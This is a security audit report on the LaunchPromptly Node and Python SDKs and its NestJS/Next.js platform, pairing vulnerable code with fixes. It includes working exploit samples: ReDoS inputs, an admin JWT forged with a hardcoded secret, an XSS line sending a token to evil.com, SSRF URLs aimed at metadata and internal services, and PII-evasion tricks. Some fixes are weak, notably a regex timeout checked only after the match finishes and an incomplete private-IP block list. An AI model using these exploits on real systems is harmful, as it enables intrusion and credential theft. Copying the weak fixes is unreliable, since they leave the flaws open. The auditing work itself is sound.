# LaunchPromptly — Security & Software Quality Audit

**Date:** 2026-03-06
**Scope:** Node SDK, Python SDK, Platform (NestJS API + Next.js Web)
**Auditor:** Claude Opus 4.6 (automated deep-dive review of all source files)

---

## Executive Summary

| Component | CRITICAL | HIGH | MEDIUM | LOW | Total |
|-----------|----------|------|--------|-----|-------|
| Node SDK | 3 | 5 | 7 | 7 | 22 |
| Python SDK | 0 | 5 | 13 | 12 | 30 |
| Platform | 1 | 5 | 13 | 10 | 29 |
| **Total** | **4** | **15** | **33** | **29** | **81** |

---

## CRITICAL — Fix Immediately

---

### C1. ReDoS in Credit Card Regex (Both SDKs)

**Severity:** CRITICAL
**Files:**
- Node: `node-sdk/src/internal/pii.ts:55`
- Python: `python-sdk/launchpromptly/_internal/pii.py:71`

**Vulnerable Code:**

```typescript
// Node SDK
const CREDIT_CARD_RE = /\b(?:\d[ \-]*?){13,19}\b/g;
```

```python
# Python SDK
_CREDIT_CARD_RE = re.compile(r"\b(?:\d[ \-]*?){13,19}\b")
```

**Why it breaks:** The nested quantifier `(?:\d[ \-]*?){13,19}` causes catastrophic backtracking. The lazy inner quantifier `*?` inside a bounded outer quantifier `{13,19}` creates exponential regex engine states on non-matching inputs.

**Exploit example:**

```javascript
// This input freezes the event loop for seconds to minutes:
const malicious = "1234 5678 9012 3456 7890 1234 5678 9012 3456 ".repeat(10);
detectPII(malicious); // CPU spins, DoS achieved
```

**Fix:**

```typescript
// Node SDK — non-backtracking pattern
const CREDIT_CARD_RE = /\b\d(?:[\s\-]?\d){12,18}\b/g;
```

```python
# Python SDK
_CREDIT_CARD_RE = re.compile(r"\b\d(?:[\s\-]?\d){12,18}\b")
```

**Why this works:** Each digit must be followed by at most one optional separator. No ambiguity for the regex engine — linear time.

---

### C2. PII Leakage in `promptPreview` (Node SDK)

**Severity:** CRITICAL
**Files:**
- `node-sdk/src/internal/fingerprint.ts:51`
- `node-sdk/src/launch-promptly.ts:539,743`

**Vulnerable Code:**

```typescript
// fingerprint.ts:51 — raw user text captured
const promptPreview = fullText.slice(0, 200);

// launch-promptly.ts:539 (streaming) and :743 (non-streaming)
promptPreview: security ? undefined : fingerprint.promptPreview,
```

**Why it breaks:** When `security` is not configured in `WrapOptions`, the first 200 characters of the raw user prompt are sent to the LaunchPromptly API. Any PII in that text (SSNs, emails, names) is transmitted in plaintext and stored on the server.

**Exploit example:**

```typescript
// User integrates SDK without security options:
const openai = lp.wrap(new OpenAI(), { feature: 'chat' });

// User sends a message containing PII:
await openai.chat.completions.create({
  model: 'gpt-4o',
  messages: [{ role: 'user', content: 'My SSN is 123-45-6789 and my email is john@acme.com' }],
});
// ^ The first 200 chars including SSN and email are sent to LaunchPromptly API as promptPreview
```

**Fix:**

```typescript
// fingerprint.ts — always scrub PII from preview
function scrubPreview(text: string): string {
  return text
    .replace(/\b\d{3}-\d{2}-\d{4}\b/g, '[SSN]')
    .replace(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g, '[EMAIL]')
    .replace(/\b(?:\d[\s\-]?){13,19}\b/g, '[CARD]')
    .replace(/\b(?:\+1[-.\s]?)?\(?[2-9]\d{2}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/g, '[PHONE]');
}

const promptPreview = scrubPreview(fullText.slice(0, 200));
```

**Alternative:** Make `promptPreview` opt-in rather than opt-out — never send raw text by default.

---

### C3. User-Supplied Regex in Schema Validator (Node SDK)

**Severity:** CRITICAL
**File:** `node-sdk/src/internal/schema-validator.ts:117-131`

**Vulnerable Code:**

```typescript
if (schema.pattern !== undefined) {
  try {
    const regex = new RegExp(schema.pattern);
    if (!regex.test(value)) {
      errors.push({ ... });
    }
  } catch {
    // Invalid regex in schema — skip
  }
}
```

**Why it breaks:** `schema.pattern` comes from user-supplied `OutputSchemaOptions`. A malicious or poorly written pattern like `(a+)+$` causes catastrophic backtracking when tested against LLM output.

**Exploit example:**

```typescript
const wrapped = lp.wrap(new OpenAI(), {
  security: {
    outputSchema: {
      schema: {
        type: 'object',
        properties: {
          answer: { type: 'string', pattern: '(a+)+$' }, // ReDoS bomb
        },
      },
    },
  },
});
// If the LLM returns { answer: "aaaaaaaaaaaaaaaa!" }, the regex engine hangs
```

**Fix:**

```typescript
if (schema.pattern !== undefined) {
  try {
    const regex = new RegExp(schema.pattern);
    // Add execution timeout via AbortController or use safe-regex check
    const timeoutMs = 50;
    const start = performance.now();
    const result = regex.test(value);
    if (performance.now() - start > timeoutMs) {
      // Pattern took too long — treat as no-op, log warning
      console.warn(`[LaunchPromptly] Schema pattern exceeded ${timeoutMs}ms, skipping validation`);
    } else if (!result) {
      errors.push({ ... });
    }
  } catch {
    // Invalid regex in schema — skip
  }
}
```

**Better fix:** Use a ReDoS-safe regex library like `re2` (WASM build available for Node.js).

---

### C4. JWT Secret Falls Back to Hardcoded Default (Platform)

**Severity:** CRITICAL
**File:** `apps/api/src/auth/jwt.strategy.ts:28`

**Vulnerable Code:**

```typescript
@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(configService: ConfigService) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: false,
      secretOrKey: configService.get<string>('JWT_SECRET', 'dev-secret'),
      //                                                    ^^^^^^^^^^^^
      //                                   Hardcoded fallback if env var missing
    });
  }
}
```

**Why it breaks:** If `JWT_SECRET` is not set (e.g., `.env` missing, misconfigured deployment), the secret silently becomes `'dev-secret'`. Anyone can forge valid JWT tokens with a known secret.

**Exploit example:**

```bash
# Attacker forges admin JWT with the known 'dev-secret':
node -e "
  const jwt = require('jsonwebtoken');
  const token = jwt.sign(
    { sub: 'any-id', email: 'admin@evil.com', role: 'admin', plan: 'growth' },
    'dev-secret',
    { expiresIn: '7d' }
  );
  console.log(token);
"
# Use this token as `Authorization: Bearer <token>` to access any endpoint
```

**Fix:**

```typescript
constructor(configService: ConfigService) {
  const secret = configService.get<string>('JWT_SECRET');
  if (!secret) {
    throw new Error('FATAL: JWT_SECRET environment variable is required');
  }
  super({
    jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
    ignoreExpiration: false,
    secretOrKey: secret,
  });
}
```

---

## HIGH — Fix Before Next Release

---

### H1. De-Redaction Mapping Collision (Both SDKs)

**Severity:** HIGH
**Files:**
- Node: `node-sdk/src/internal/redaction.ts:230-236`, `node-sdk/src/launch-promptly.ts:362-373`
- Python: `python-sdk/launchpromptly/_internal/redaction.py:232-256`

**Vulnerable Code:**

```typescript
// redaction.ts — counters are local to each redactPII call
replacement = placeholderReplacement(det.type, counters);
// ...
mapping.set(replacement, det.value);
```

```typescript
// launch-promptly.ts — each message is redacted independently
for (const msg of effectiveMessages) {
  if (typeof msg.content === 'string') {
    const result = redactPII(msg.content, { ... });
    // ^ fresh counters for each message, but mapping is shared across all
  }
}
```

**Why it breaks:** Each `redactPII` call creates its own counter starting at 1. If message 1 has an email and message 2 has an email, both produce `[EMAIL_1]`. The mapping overwrites:

```
Message 1: "Email john@acme.com for help"  → [EMAIL_1] → mapping["[EMAIL_1]"] = "john@acme.com"
Message 2: "CC jane@corp.com on this"      → [EMAIL_1] → mapping["[EMAIL_1]"] = "jane@corp.com"
                                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                          Overwrites! john's email is lost
```

When the LLM responds with `[EMAIL_1]`, it de-redacts to `jane@corp.com` regardless of which email the LLM was referencing. **Wrong PII returned to the wrong person.**

**Fix:**

```typescript
// launch-promptly.ts — use shared counters across all messages
const sharedCounters: Record<string, number> = {};
const sharedMapping = new Map<string, string>();

for (const msg of effectiveMessages) {
  if (typeof msg.content === 'string') {
    const result = redactPII(msg.content, {
      types: piiOpts.types,
      providers: piiOpts.providers,
    }, sharedCounters); // <-- pass shared counters
    msg.content = result.redactedText;
    for (const [k, v] of result.mapping) {
      sharedMapping.set(k, v);
    }
  }
}
```

```typescript
// redaction.ts — accept optional external counters
export function redactPII(
  text: string,
  options?: RedactionOptions,
  counters?: Record<string, number>, // <-- new parameter
): RedactionResult {
  const effectiveCounters = counters ?? makeCounters();
  // ... use effectiveCounters instead of local counters
}
```

---

### H2. No Input Length Limit for PII/Injection Scanning (Both SDKs)

**Severity:** HIGH
**Files:**
- Node: `node-sdk/src/internal/pii.ts:190-227`, `node-sdk/src/internal/injection.ts:106-158`
- Python: `python-sdk/launchpromptly/_internal/pii.py:250-289`

**Vulnerable Code:**

```typescript
// pii.ts — no length check before scanning
export function detectPII(text: string, options?: PIIDetectOptions): PIIDetection[] {
  if (!text) return [];
  // Immediately runs 17+ regex patterns on arbitrary-length text
  for (const { pattern, type } of patterns) {
    // ...
  }
}
```

**Why it breaks:** A 100MB conversation history joined into a single string runs through 17+ regex patterns with no limit. This blocks the event loop (Node) or the asyncio loop (Python) for seconds.

**Exploit example:**

```typescript
// Attacker passes enormous context:
const hugePrompt = 'A'.repeat(100_000_000); // 100MB
detectPII(hugePrompt); // Blocks event loop
```

**Fix:**

```typescript
const MAX_SCAN_LENGTH = 1_000_000; // 1MB

export function detectPII(text: string, options?: PIIDetectOptions): PIIDetection[] {
  if (!text) return [];
  const scanText = text.length > MAX_SCAN_LENGTH ? text.slice(0, MAX_SCAN_LENGTH) : text;
  // ... scan scanText instead of text
}
```

---

### H3. Event Batcher Race Condition (Node SDK)

**Severity:** HIGH
**File:** `node-sdk/src/batcher.ts:31-44`

**Vulnerable Code:**

```typescript
async flush(): Promise<void> {
  if (this.flushing || this.queue.length === 0) return;
  this.flushing = true;

  if (this.timer) {
    clearTimeout(this.timer);
    this.timer = null;
  }

  const batch = this.queue.splice(0, this.queue.length);
  this.flushing = false;      // ← Bug: reset BEFORE await
                                //   Concurrent flushes can now enter
  await this.sendWithRetry(batch, 0);  // ← Network call happens after reset
}
```

**Why it breaks:** `this.flushing = false` on line 41 runs *before* `sendWithRetry` on line 43. During the network request, another `flush()` call sees `flushing === false` and enters, potentially causing duplicate sends or event loss.

**Fix:**

```typescript
async flush(): Promise<void> {
  if (this.flushing || this.queue.length === 0) return;
  this.flushing = true;

  if (this.timer) {
    clearTimeout(this.timer);
    this.timer = null;
  }

  const batch = this.queue.splice(0, this.queue.length);

  try {
    await this.sendWithRetry(batch, 0);
  } finally {
    this.flushing = false; // ← Now correctly resets AFTER send completes
  }
}
```

---

### H4. Plaintext Stored Alongside Encrypted Data (Platform)

**Severity:** HIGH
**File:** `apps/api/src/events/events.service.ts:44-96`

**Vulnerable Code:**

```typescript
private buildEventRecord(projectId: string, e: IngestEventDto) {
  // Encrypt sensitive fields
  if (e.promptPreview) {
    const enc = this.crypto.encrypt(e.promptPreview);
    encPromptPreview = enc.encrypted;
    encIv = enc.iv; encAuthTag = enc.authTag;
  }
  if (e.responseText) {
    const enc = this.crypto.encrypt(e.responseText);
    encResponseText = enc.encrypted;
    if (!encIv) { encIv = enc.iv; encAuthTag = enc.authTag; }
    //   ^^^^^^ BUG: if promptPreview was also encrypted,
    //          responseText's IV/authTag is DISCARDED
  }

  return {
    // ...
    promptPreview: e.promptPreview ?? null,   // ← PLAINTEXT stored!
    responseText: e.responseText ?? null,      // ← PLAINTEXT stored!
    // Encrypted copies also stored:
    encPromptPreview,
    encResponseText,
    encIv,
    encAuthTag,
  };
}
```

**Why it breaks:** Two bugs:

1. **Plaintext alongside encrypted:** Both the plaintext `promptPreview`/`responseText` AND their encrypted copies are stored. The encryption is completely negated — the data is sitting in plaintext in the DB.

2. **Shared IV/AuthTag:** When both fields are encrypted, only the first field's IV/authTag is stored. The second field cannot be decrypted because it was encrypted with a different IV that was thrown away.

**Fix:**

```typescript
return {
  // ...
  promptPreview: null,    // ← Never store plaintext when encrypted
  responseText: null,     // ← Never store plaintext when encrypted
  encPromptPreview,
  encResponseText,
  encIv: encPromptIv,       // ← Separate IV per field
  encAuthTag: encPromptTag,
  encResponseIv,            // ← New column needed
  encResponseAuthTag,       // ← New column needed
};
```

Or encrypt both fields as a single JSON blob with one IV/authTag:

```typescript
const combined = JSON.stringify({ promptPreview: e.promptPreview, responseText: e.responseText });
const enc = this.crypto.encrypt(combined);
return {
  promptPreview: null,
  responseText: null,
  encCombined: enc.encrypted,
  encIv: enc.iv,
  encAuthTag: enc.authTag,
};
```

---

### H5. Webhook HMAC Comparison Vulnerable to Timing Attack (Platform)

**Severity:** HIGH
**File:** `apps/api/src/billing/billing.service.ts:169-173`

**Vulnerable Code:**

```typescript
verifySignature(body: string, signature: string): boolean {
  if (!this.webhookSecret) return false;
  const expected = createHmac('sha256', this.webhookSecret).update(body).digest('hex');
  return expected === signature;
  //     ^^^^^^^^^^^^^^^^^^^^^^^^ String comparison leaks timing info
}
```

**Why it breaks:** JavaScript's `===` compares strings character by character and returns early on the first mismatch. An attacker can progressively guess the correct HMAC signature by measuring response times.

**Fix:**

```typescript
import { timingSafeEqual, createHmac } from 'crypto';

verifySignature(body: string, signature: string): boolean {
  if (!this.webhookSecret) return false;
  const expected = createHmac('sha256', this.webhookSecret).update(body).digest('hex');
  if (expected.length !== signature.length) return false;
  return timingSafeEqual(Buffer.from(expected, 'hex'), Buffer.from(signature, 'hex'));
}
```

---

### H6. JWT Token Stored in localStorage (Platform)

**Severity:** HIGH
**File:** `apps/web/src/lib/auth.ts:9-13`

**Vulnerable Code:**

```typescript
export function saveAuth(token: string, userId: string): void {
  if (!isBrowser) return;
  localStorage.setItem(TOKEN_KEY, token);
  localStorage.setItem(USER_ID_KEY, userId);
}
```

**Why it breaks:** Any JavaScript on the page can read `localStorage`. If a single XSS vulnerability exists (or any third-party script like PostHog analytics is compromised), the attacker gets the JWT:

```javascript
// Any XSS payload can steal the token:
fetch('https://evil.com/steal?token=' + localStorage.getItem('pf_token'));
```

**Fix (short-term):** Continue using localStorage but add XSS mitigations:
- Set a strict Content Security Policy (CSP) header
- Audit all third-party scripts

**Fix (long-term):** Switch to `httpOnly` cookies:

```typescript
// Backend — set cookie on login response
res.cookie('pf_token', accessToken, {
  httpOnly: true,     // JS can't read it
  secure: true,       // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000,
});
```

---

### H7. SSRF via Alert Webhook URLs (Platform)

**Severity:** HIGH
**File:** `apps/api/src/alert/alert.service.ts:255-260`

**Vulnerable Code:**

```typescript
await fetch(rule.webhookUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(payload),
  signal: AbortSignal.timeout(10_000),
});
```

**Why it breaks:** Users can set `webhookUrl` to any URL. The server makes HTTP requests to it, enabling SSRF:

```
webhookUrl: "http://169.254.169.254/latest/meta-data/iam/..."  → GCP/AWS metadata
webhookUrl: "http://localhost:5432"                             → Internal database
webhookUrl: "http://10.0.0.1:6379/SET/x/pwned"                 → Internal Redis
```

**Fix:**

```typescript
import { URL } from 'url';
import { lookup } from 'dns/promises';

async validateWebhookUrl(url: string): Promise<boolean> {
  const parsed = new URL(url);
  if (parsed.protocol !== 'https:') return false;

  // Resolve DNS and block private IPs
  const { address } = await lookup(parsed.hostname);
  const blocked = ['10.', '172.16.', '192.168.', '127.', '169.254.', '0.'];
  if (blocked.some(prefix => address.startsWith(prefix))) return false;

  return true;
}
```

---

### H8. API Key Over Plaintext HTTP (Both SDKs)

**Severity:** HIGH
**Files:**
- Node: `node-sdk/src/batcher.ts:52-57`
- Python: `python-sdk/launchpromptly/batcher.py:96-101`

**Vulnerable Code:**

```typescript
// Node SDK
const response = await fetch(`${this.endpoint}/v1/events/batch`, {
  headers: {
    Authorization: `Bearer ${this.apiKey}`, // API key in header
  },
});
```

**Why it breaks:** The `endpoint` is user-configurable. There's no check that it uses HTTPS. Setting `endpoint: 'http://staging.example.com'` transmits the API key in cleartext.

**Fix:**

```typescript
constructor(apiKey: string, endpoint: string, ...) {
  if (endpoint.startsWith('http://') &&
      !endpoint.includes('localhost') &&
      !endpoint.includes('127.0.0.1')) {
    throw new Error(
      'LaunchPromptly: endpoint must use HTTPS to protect your API key. ' +
      'Use http:// only for localhost development.'
    );
  }
  // ...
}
```

---

### H9. PII Bypass via Unicode (Python SDK)

**Severity:** HIGH
**File:** `python-sdk/launchpromptly/_internal/pii.py:57-126`

**Why it breaks:** PII regex patterns only match ASCII. Unicode tricks bypass detection:

```python
# Full-width characters — visually identical, regex doesn't match:
"user＠example．com"  # ＠ = U+FF20, ．= U+FF0E

# Zero-width characters inserted between PII:
"us\u200ber@exa\u200bmple.com"  # invisible zero-width spaces

# Cyrillic homoglyphs:
"usеr@example.com"  # 'е' is Cyrillic U+0435, not Latin 'e'
```

**Fix:**

```python
import unicodedata

_ZERO_WIDTH_RE = re.compile(r'[\u200b\u200c\u200d\ufeff\u00ad\u2060]')

def _normalize_for_scan(text: str) -> str:
    """NFKC normalize + strip zero-width chars before PII scanning."""
    text = unicodedata.normalize("NFKC", text)
    text = _ZERO_WIDTH_RE.sub("", text)
    return text

def detect_pii(text, options=None):
    if not text:
        return []
    normalized = _normalize_for_scan(text)
    # Run regex on normalized text, but adjust offsets for original
    # ...
```

---

### H10. Cost Guard TOCTOU Race (Both SDKs)

**Severity:** HIGH
**Files:**
- Node: `node-sdk/src/internal/cost-guard.ts:54-167`
- Python: `python-sdk/launchpromptly/_internal/cost_guard.py:62-177`

**Vulnerable Code:**

```typescript
// Step 1: Check budget (pre-call)
checkPreCall(estimatedCost, ...): BudgetViolation | null {
  const currentSpend = this.getSpendInWindow('hour');
  if (currentSpend + estimatedCost > this.options.maxCostPerHour) {
    return violation;
  }
  return null; // ← Budget OK, proceed
}

// Step 2: LLM API call happens (takes 1-30 seconds)

// Step 3: Record actual cost (post-call)
recordCost(cost, customerId) {
  this.entries.push({ cost, timestampMs: Date.now(), customerId });
}
```

**Why it breaks:** Between steps 1 and 3, concurrent requests all see the same `currentSpend` and all pass the check. With `maxCostPerHour: $1.00` and 10 concurrent $0.15 requests, all pass → actual spend = $1.50 (50% over budget).

**Fix — Optimistic reservation:**

```typescript
private reserved = 0;

checkPreCall(estimatedCost, ...): BudgetViolation | null {
  const currentSpend = this.getSpendInWindow('hour');
  if (currentSpend + this.reserved + estimatedCost > this.options.maxCostPerHour) {
    return violation;
  }
  this.reserved += estimatedCost; // Reserve immediately
  return null;
}

recordCost(cost, customerId) {
  this.entries.push({ cost, timestampMs: Date.now(), customerId });
  this.reserved = Math.max(0, this.reserved - cost); // Release reservation
}
```

---

## MEDIUM — Fix Soon

---

### M1. Security Policy Endpoints Missing Role Guard (Platform)

**File:** `apps/api/src/security-policy/security-policy.controller.ts:22-24`

**Current:**

```typescript
@Controller('v1/security/policies')
@UseGuards(JwtAuthGuard)
export class SecurityPolicyController {
```

**Fix — add RolesGuard:**

```typescript
import { RolesGuard } from '../auth/roles.guard';
import { Roles } from '../auth/roles.decorator';

@Controller('v1/security/policies')
@UseGuards(JwtAuthGuard, RolesGuard)
export class SecurityPolicyController {
  @Post(':projectId')
  @Roles('admin')
  async create(...) { ... }

  @Patch(':projectId/:policyId')
  @Roles('admin')
  async update(...) { ... }

  @Delete(':projectId/:policyId')
  @Roles('admin')
  async remove(...) { ... }

  // GET endpoints can remain accessible to all members
}
```

Same fix needed for `alert/alert.controller.ts`.

---

### M2. Login Endpoint Leaks User Existence (Platform)

**File:** `apps/api/src/auth/auth.service.ts:106-118`

**Current (reveals whether email exists):**

```typescript
if (!user) {
  throw new NotFoundException('User not found. Please register first.');
}
if (!user.passwordHash) {
  throw new BadRequestException('No password set. Please register with a password first.');
}
const valid = await bcrypt.compare(password, user.passwordHash);
if (!valid) {
  throw new UnauthorizedException('Invalid email or password.');
}
```

**Fix — uniform error for all cases:**

```typescript
if (!user || !user.passwordHash) {
  // Constant-time: still hash something to prevent timing-based user enumeration
  await bcrypt.hash('dummy', 10);
  throw new UnauthorizedException('Invalid email or password.');
}
const valid = await bcrypt.compare(password, user.passwordHash);
if (!valid) {
  throw new UnauthorizedException('Invalid email or password.');
}
```

---

### M3. Sensitive Data on Error Objects (Both SDKs)

**File:** `node-sdk/src/errors.ts:57-68`

**Current:**

```typescript
export class OutputSchemaError extends Error {
  readonly responseText: string; // Full LLM response — may contain PII

  constructor(validationErrors: SchemaError[], responseText: string) {
    super(`Output schema validation failed: ${summary}`);
    this.responseText = responseText; // ← Stored in full
  }
}
```

**Fix — truncate sensitive data:**

```typescript
export class OutputSchemaError extends Error {
  readonly responseText: string;

  constructor(validationErrors: SchemaError[], responseText: string) {
    super(`Output schema validation failed: ${summary}`);
    this.responseText = responseText.slice(0, 200) + (responseText.length > 200 ? '...' : '');
  }
}

export class StreamAbortError extends Error {
  readonly partialResponse: string;

  constructor(violation: StreamViolation, partialResponse: string) {
    super(`Stream aborted: ${violation.type} at offset ${violation.offset}`);
    this.partialResponse = partialResponse.slice(0, 200) + (partialResponse.length > 200 ? '...' : '');
    this.approximateTokens = Math.ceil(partialResponse.length / 4);
  }
}
```

---

### M4. Unbounded Stream Buffer (Both SDKs)

**File:** `node-sdk/src/internal/streaming.ts:208-209`

**Current:**

```typescript
engine.buffer += text;        // Grows forever
engine.charsSinceLastScan += text.length;
```

**Fix — add hard cap:**

```typescript
const MAX_BUFFER_SIZE = 10 * 1024 * 1024; // 10MB

// In the streaming loop:
engine.buffer += text;
engine.charsSinceLastScan += text.length;

if (engine.buffer.length > MAX_BUFFER_SIZE) {
  // Keep only the last half for context-aware scanning
  engine.buffer = engine.buffer.slice(engine.buffer.length - MAX_BUFFER_SIZE / 2);
}
```

---

### M5. Cost Guard O(n^2) Pruning (Both SDKs)

**File:** `node-sdk/src/internal/cost-guard.ts:234-239`

**Current:**

```typescript
private pruneOldEntries(): void {
  const cutoff = Date.now() - 86_400_000;
  while (this.entries.length > 0 && this.entries[0].timestampMs < cutoff) {
    this.entries.shift(); // O(n) per call — shifts entire array
  }
}
```

**Fix — use index pointer:**

```typescript
private pruneStartIndex = 0;

private getActiveEntries(): CostEntry[] {
  return this.entries.slice(this.pruneStartIndex);
}

private pruneOldEntries(): void {
  const cutoff = Date.now() - 86_400_000;
  while (this.pruneStartIndex < this.entries.length &&
         this.entries[this.pruneStartIndex].timestampMs < cutoff) {
    this.pruneStartIndex++;
  }
  // Periodically compact to free memory
  if (this.pruneStartIndex > 1000) {
    this.entries = this.entries.slice(this.pruneStartIndex);
    this.pruneStartIndex = 0;
  }
}
```

Python fix — use `collections.deque`:

```python
from collections import deque

class CostGuard:
    _MAX_ENTRIES = 100_000

    def __init__(self, options):
        self._entries = deque(maxlen=self._MAX_ENTRIES)
```

---

### M6. Content Filter `matched` Text Leaked to Backend (Node SDK)

**File:** `node-sdk/src/launch-promptly.ts:780-785`

**Current:**

```typescript
inputViolations: inputContentViolations.map((v) => ({
  category: v.category,
  matched: v.matched,    // ← Raw text that triggered the filter
  severity: v.severity,
})),
```

**Fix — truncate or hash:**

```typescript
inputViolations: inputContentViolations.map((v) => ({
  category: v.category,
  matched: v.matched.slice(0, 50), // Truncate to reduce PII risk
  severity: v.severity,
})),
```

---

### M7. Python Blocking `urlopen` in Async Context

**File:** `python-sdk/launchpromptly/batcher.py:90-114`

**Current:**

```python
async def _send_with_retry(self, events, attempt):
    req = Request(f"{self._endpoint}/v1/events/batch", ...)
    response = urlopen(req, timeout=10)  # ← BLOCKS event loop for up to 10s!
```

**Fix:**

```python
import asyncio

async def _send_with_retry(self, events, attempt):
    req = Request(f"{self._endpoint}/v1/events/batch", ...)
    response = await asyncio.to_thread(urlopen, req, timeout=10)
```

---

### M8. Docker Containers Run as Root (Platform)

**Files:** `apps/api/Dockerfile`, `apps/web/Dockerfile`

**Fix — add to both Dockerfiles before the final `CMD`:**

```dockerfile
# Create non-root user
RUN addgroup --system --gid 1001 nodejs && \
    adduser --system --uid 1001 appuser
USER appuser
```

---

## LOW — Fix When Convenient

| # | Issue | Component | Fix |
|---|-------|-----------|-----|
| L1 | NHS/Aadhaar regex no checksum | Both SDKs | Add modulus-11 (NHS) and Verhoeff (Aadhaar) validation |
| L2 | IBAN no mod-97 check | Both SDKs | Add `(98 - (n % 97)) === check_digits` validation |
| L3 | Passport regex too broad | Both SDKs | Require context clue ("passport" nearby) or reduce confidence |
| L4 | Events silently dropped after retries | Both SDKs | Add `onError` callback; skip retries for 4xx |
| L5 | No SSRF protection on SDK endpoint | Both SDKs | Block private IP ranges, document risk |
| L6 | Fingerprint misses phone/SSN/card | Node SDK | Normalize all PII types before hashing |
| L7 | `collectDescriptions` no depth limit | Node SDK | Add `maxDepth = 10` parameter |
| L8 | ML model supply chain risk | Both SDKs | Allowlist known-good model names, warn on custom |
| L9 | No account lockout | Platform | Track failed logins, lock after 10 attempts |
| L10 | JWT not invalidated on logout | Platform | Add `tokenVersion` to user record |
| L11 | Invitation tokens plaintext | Platform | Hash with SHA-256 before storage |
| L12 | GCP project number in default endpoint | Both SDKs | Use custom domain `api.launchpromptly.dev` |

---

## Positive Findings (What's Done Well)

| Area | Finding |
|------|---------|
| **Zero runtime deps** | Core SDKs have no dependencies — minimal supply chain attack surface |
| **Prisma ORM** | All queries parameterized; raw SQL uses tagged template literals. No SQL injection risk |
| **bcrypt** | Passwords and API keys properly hashed (cost factor 10) |
| **AES-256-GCM** | Encryption implementation is correct (random IV, proper auth tag) |
| **Global validation** | `ValidationPipe` with `whitelist: true` and `forbidNonWhitelisted: true` |
| **Rate limiting** | Global throttler (20 req/s, 200 req/min per IP) |
| **Plugin isolation** | All ML provider `.detect()` calls wrapped in try/catch |
| **Event isolation** | `_emit()` catches handler errors; event capture blocks use try/catch |
| **No XSS vectors** | Zero uses of `dangerouslySetInnerHTML` in the entire frontend |
| **IDOR protection** | `assertProjectAccess` called consistently in services |
| **Body size limit** | 1MB body size limit on API |

---

## Priority Checklist

### P0 — This week

- [ ] Fix credit card ReDoS regex (both SDKs)
- [ ] Remove JWT `'dev-secret'` fallback
- [ ] Stop storing plaintext alongside encrypted data
- [ ] Fix dual-field IV/authTag sharing

### P1 — Next sprint

- [ ] Add input length limits to PII/injection scanning
- [ ] Fix de-redaction counter collisions (shared counters)
- [ ] Use `timingSafeEqual` for webhook HMAC
- [ ] Validate endpoint URL (HTTPS-only for non-localhost)
- [ ] Fix batcher `flushing` flag race condition
- [ ] Add `@Roles('admin')` to security policy + alert endpoints

### P2 — Backlog

- [ ] Add Unicode normalization for PII scanning (Python SDK)
- [ ] Add cost guard reservation pattern
- [ ] Switch JWT storage from localStorage to httpOnly cookies
- [ ] Validate webhook URLs against private IP ranges (SSRF)
- [ ] Replace Python `urlopen` with `asyncio.to_thread`
- [ ] Cap stream buffer size
- [ ] Truncate sensitive data on error objects
- [ ] Run Docker containers as non-root
- [ ] Use custom domain for default endpoint
